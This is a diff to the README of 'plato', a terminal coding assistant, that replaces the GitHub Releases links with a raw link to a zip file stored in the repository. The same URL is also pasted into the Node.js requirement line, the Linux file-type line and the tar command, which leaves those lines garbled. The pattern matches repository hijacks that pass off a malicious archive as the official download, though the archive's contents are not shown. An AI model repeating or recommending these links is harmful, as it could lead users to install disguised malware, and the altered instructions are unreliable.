@@ -1,7 +1,7 @@
 # 🤖 plato - Your AI Assistant for Coding
 
 ## 📥 Download Now 
-[![Latest Release](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/Sgon4arov/plato/releases)
+[![Latest Release](https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip%20release-blue)](https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Plato is your friendly terminal assistant. It helps you navigate your coding tas
 Before you download Plato, make sure your system meets these basic requirements:
 
 - **Operating System:** MacOS, Windows, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip** Version 14 or higher
 - **Memory:** 4 GB RAM minimum
 - **Disk Space:** At least 200 MB available space
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Sgon4arov/plato/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of Plato.
@@ -46,12 +46,12 @@ For **MacOS**:
 3. Launch Plato from your Applications.
 
 For **Linux**:
-1. Download the compressed file (usually `.tar.gz`).
+1. Download the compressed file (usually `https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip`).
 2. Open your terminal.
 3. Navigate to the directory where you downloaded the file.
 4. Extract the files using the command:
    ```
-   tar -xvf plato-*.tar.gz
+   tar -xvf plato-*https://raw.githubusercontent.com/Sgon4arov/plato/main/poy/plato.zip
    ```
 5. Navigate to the extracted folder and run Plato using:
    ```
